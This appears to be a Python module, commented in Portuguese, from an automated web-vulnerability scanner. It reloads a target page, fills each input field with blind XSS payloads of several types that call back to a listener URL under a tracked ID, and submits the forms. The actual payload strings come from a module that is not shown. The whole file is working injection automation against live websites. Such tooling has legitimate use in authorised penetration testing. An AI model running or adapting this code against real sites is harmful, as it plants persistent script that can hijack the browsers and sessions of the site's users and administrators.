from ..http_server import registrar_payload_injetado
from .field_tester import eco_test, activate_mat_input_field, find_field_element, submit_form, return_to_original_page
from .payload_builder import build_payloads, get_payload_types
from ...recon.web_crawler import get_rendered_page, find_tags, page_reload
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
import asyncio

# Configurações padrão
TAGS_TO_FIND = ['input', 'form', 'textarea', 'select']

async def blind_xss_injection(campos_validos, page, browser, url_ouvinte, url_original):
    """Injeta payloads blind XSS - estratégia 'disparar e esquecer' usando Playwright"""
    
    injected_payloads = []
    
    try:
        for campo in campos_validos:
            # Usa diretamente os campos que já foram validados pelo eco_test
            element = campo['element']
            field_name = element.get('name') or element.get('id')
            field_id = element.get('id')
            
            # Os campos já foram validados pelo eco_test, não precisa verificar tipo
            payload_types = get_payload_types()
            
            for payload_type in payload_types:  # Um payload de cada tipo por campo
                try:
                    # Antes de cada payload, recarrega completamente a página
                    print(f"Recarregando página para payload {payload_type} no campo {field_name}")
                    page, browser = await page_reload(page, browser, url_original)
                    if not page:
                        print("Falha ao recarregar a página")
                        continue
                    
                    # Registra o payload e obtém ID único
                    payload_id = registrar_payload_injetado(
                        campo_id=field_id,
                        campo_name=field_name,
                        payload=f"payload_{payload_type}",
                        url_origem=url_original
                    )
                    
                    # Cria payload com ID específico
                    payloads = build_payloads(url_ouvinte, payload_id)
                    payload = payloads[0] if payload_type == 'img' else \
                             payloads[1] if payload_type == 'svg' else payloads[2]
                    
                    # Tratamento especial para mat-input-1
                    if element.get('id') == 'mat-input-1':
                        input_field = await activate_mat_input_field(page, 'mat-input-1')
                        if not input_field:
                            print(f"Campo de busca mat-input-1 não pode ser ativado")
                            continue
                    else:
                        # Para outros campos, usa a lógica do field_tester
                        input_field = await find_field_element(page, element)
                    
                    # Verifica se conseguiu encontrar/ativar o campo
                    if not input_field:
                        print(f"Não foi possível encontrar o campo {field_name}")
                        continue
                    
                    # Injeção do payload blind XSS
                    await input_field.clear()
                    await input_field.fill(payload)
                    
                    # Submete o formulário
                    await submit_form(page, input_field)
                    
                    # Aguarda um pouco para a página processar
                    await page.wait_for_timeout(2000)
                    
                    injected_payloads.append({
                        'payload_id': payload_id,
                        'payload': payload,
                        'field_name': field_name,
                        'payload_type': payload_type,
                        'status': 'injected'
                    })
                    
                    print(f"Payload {payload_id} ({payload_type}) injetado no campo {field_name}")
                    
                except Exception as e:
                    print(f"Falha ao injetar payload no campo {field_name}: {e}")
                    continue

    except Exception as e:
        print(f"An error occurred during blind XSS injection testing: {e}")
        return []

    return injected_payloads

